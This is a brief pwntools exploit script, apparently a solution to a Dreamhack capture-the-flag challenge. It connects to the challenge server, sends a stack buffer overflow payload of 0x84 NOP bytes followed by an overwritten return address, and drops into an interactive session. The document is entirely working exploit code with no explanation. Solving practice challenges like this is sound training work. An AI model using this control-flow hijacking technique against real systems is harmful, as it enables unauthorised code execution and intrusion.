from pwn import *

p = remote('host1.dreamhack.games', 21770)

pay = '\x90'*0x84
pay += '\xb9\x85\x04\x08'

p.sendline(pay)

p.interactive()
